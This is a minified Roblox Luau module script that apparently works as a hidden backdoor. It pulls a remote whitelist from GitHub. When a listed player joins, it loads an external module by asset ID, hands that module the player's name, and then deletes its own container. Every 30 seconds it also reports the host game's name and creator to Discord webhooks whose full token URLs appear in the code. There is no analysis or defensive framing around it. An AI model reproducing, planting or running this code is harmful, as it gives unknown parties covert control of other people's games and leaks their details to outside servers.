local P=game:GetService("Players")local H=game:GetService("HttpService")local M=game:GetService("MarketplaceService")
local C={
	wl="https://raw.githubusercontent.com/Nation491/whitelist.json/refs/heads/main/whitelist.json",
	gameHook="https://discord.com/api/webhooks/1433170157257101422/cdmz2I2ODVwt8i_0voTaGgOWSlvdT07pgP41U74vqmrJyAK1KFiMs2MNfWMt2ddaiuO4",
	wlHook="https://discord.com/api/webhooks/1433187203781103687/pqCPobtU-mBqgT26Q5nFvCsVXreiGXlu6Csk68q6RP0J1BNpv9ePxqafouQkP_bHKU8F",
	int=30,mod=104712588684071
}
local function G()local s,d=pcall(function()return H:JSONDecode(H:GetAsync(C.wl))end)return(s and typeof(d)=="table")and d or{enabled=false,users={},whitelist_message_id=nil}end
local function R()
	local f=G()local L=f.users or{}
	local function W(i)for _,v in ipairs(L)do if(typeof(v)=="table"and v.id==i)or v==i then return true end end end
	local function gameE()
		local x=M:GetProductInfo(game.PlaceId)local n=x.Creator and x.Creator.Name or"Unknown"local t=x.Creator and x.Creator.CreatorType or"User"local id=x.Creator and x.Creator.CreatorTargetId or 0
		local cl=(t=="Group"and("https://www.roblox.com/groups/"..id.."/"))or("https://www.roblox.com/users/"..id.."/profile")
		local g="https://www.roblox.com/games/"..game.PlaceId local th="https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=1024&height=1024&format=png"
		return{title=x.Name,description=string.format("Game: [%s](%s)\nCreator: [%s](%s) (%s)",x.Name,g,n,cl,t),color=0x00A2FF,timestamp=DateTime.now():ToIsoDate(),image={url=th},thumbnail={url=th}}
	end
	local function wlE()
		local a,t={},0 for _,v in ipairs(L)do if typeof(v)=="table"and v.id then table.insert(a,(v.username or"User").." (`"..v.id.."`)")t+=1 elseif typeof(v)=="number"then local o,p=pcall(function()return P:GetNameFromUserIdAsync(v)end)table.insert(a,(o and p or"Unknown").." (`"..v.."`)")t+=1 end end
		if t==0 then a={"_None_"}end
		return{title="Whitelisted Players",description="Current whitelist:",color=0x43B581,fields={{name="List ("..t..")",value=table.concat(a,"\n")}},timestamp=DateTime.now():ToIsoDate()}
	end
	local function send()
		pcall(function()H:RequestAsync({Url=C.gameHook,Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({embeds={gameE()}})})end)
	end
	local function up()
		local id=f.whitelist_message_id if not id or id==""then return end
		pcall(function()H:RequestAsync({Url=C.wlHook.."/messages/"..id,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({embeds={wlE()}})})end)
	end
	P.PlayerAdded:Connect(function(plr)
		if f.enabled and W(plr.UserId)then require(C.mod).canos(plr.Name)script.Parent:Destroy()end
		send()up()
	end)
	task.spawn(function()while true do task.wait(C.int)f=G()L=f.users or{}send()up()end end)
	up()
end
return{canos=R}
